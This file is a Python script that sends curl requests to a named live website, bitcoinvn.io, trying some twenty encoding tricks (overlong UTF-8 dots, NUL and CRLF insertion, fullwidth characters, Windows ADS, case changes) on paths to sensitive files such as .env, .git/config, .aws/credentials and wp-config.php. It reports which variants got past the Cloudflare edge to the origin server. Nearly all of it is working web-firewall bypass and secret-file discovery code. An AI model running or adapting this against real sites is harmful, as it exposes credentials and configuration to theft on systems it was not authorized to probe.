#!/usr/bin/env python3
"""Config-file encoding sweep: can dotfile/config rules be bypassed with compact agnostic encodings?"""
import subprocess, json, sys

# Discriminator: CF-edge 403 has NO CSP header; origin responses have CSP (UTF-8)
def probe(path):
    url = "https://bitcoinvn.io" + path
    r = subprocess.run(["curl", "-s", "-o", "/dev/null", "-D", "-", "-b", "/workspace/jar.txt",
                        "--max-time", "15", "-A", "Mozilla/5.0", url],
                       capture_output=True, text=True)
    h = r.stdout.lower()
    status = ""
    for line in h.splitlines():
        if line.startswith("http/"):
            status = line.split()[1]
    csp = "cf-edge" if ("content-security-policy" not in h and status == "403") else "origin"
    return status, csp

BASES = {
    ".env": b"\x2e\x65\x6e\x76",
    "parameters.yml": None,  # handled via str templates below
}

def enc_paths(name):
    """name like '.env' -> list of encoded path variants"""
    out = []
    plain = "/" + name
    # per-char hex pct encode
    hexall = "/" + "".join(f"%{ord(c):02x}" for c in name)
    # overlong UTF-8 for '.' (U+002E -> C0 AE)
    over = "/%c0%ae" + name[1:]
    over2 = "/%e0%80%ae" + name[1:]
    # fullwidth '.' U+FF0E
    fw = "/%ef%bc%8e" + name[1:]
    # NUL byte after extension
    nul = plain + "%00"
    # trailing dot
    td = plain + "."
    # Windows ADS
    ads = plain + "::$data"
    # semicolon param
    sp = plain + ";sysprop"
    # double slash
    ds = "//" + name
    # backslash
    bs = "/\\" + name
    # %2e for dot only
    denc = "/%2e" + name[1:]
    # uppercase
    up = "/" + name.upper()
    # case-mixed
    cm = "/" + "".join(c.upper() if i % 2 else c for i, c in enumerate(name))
    # tab/CRLF/NUL before name (separator insertion inside filename)
    ins_tab = "/" + name[0] + "%09" + name[1:]
    ins_crlf = "/" + name[0] + "%0d%0a" + name[1:]
    ins_nul = "/" + name[0] + "%00" + name[1:]
    # zwsp inside
    zwsp = "/" + (name[0] + "\u200b" + name[1:])
    # soft hyphen inside
    sh = "/" + (name[0] + "\u00ad" + name[1:])
    # overlong for first letter too
    over_first = "/%c0%ae%c0%a5" + name[2:] if name.startswith(".e") else over
    return {
        "plain(control)": plain, "hex-all": hexall, "overlong-dot": over,
        "overlong-2byte-dot": over2, "fullwidth-dot": fw, "nul-suffix": nul,
        "trailing-dot": td, "ADS": ads, "semicolon-param": sp, "double-slash": ds,
        "backslash": bs, "pct-dot-only": denc, "uppercase": up, "case-mixed": cm,
        "tab-inside": ins_tab, "crlf-inside": ins_crlf, "nul-inside": ins_nul,
        "zwsp-inside": zwsp, "softhyphen-inside": sh, "overlong-e": over_first,
    }

NAMES = [".env", ".gitignore", ".git/config", ".htaccess", "composer.json",
         "web.config", "config.yml", "parameters.yml", ".aws/credentials",
         "wp-config.php", ".DS_Store", "phpunit.xml", ".bashrc"]

results = {}
for n in NAMES:
    results[n] = {}
    for label, p in enc_paths(n).items():
        try:
            st, src = probe(p)
        except Exception as e:
            st, src = "ERR", str(e)
        results[n][label] = (st, src)
        print(f"{n:20s} {label:20s} {p[:60]:60s} -> {st} ({src})", flush=True)

# summary
print("\n=== BYPASSED (reached origin) ===")
for n, d in results.items():
    for label, (st, src) in d.items():
        if src == "origin" and label != "plain(control)":
            print(f"  {n} via {label} [{st}]")
json.dump(results, open("/workspace/config_enc_results.json","w"), indent=1)
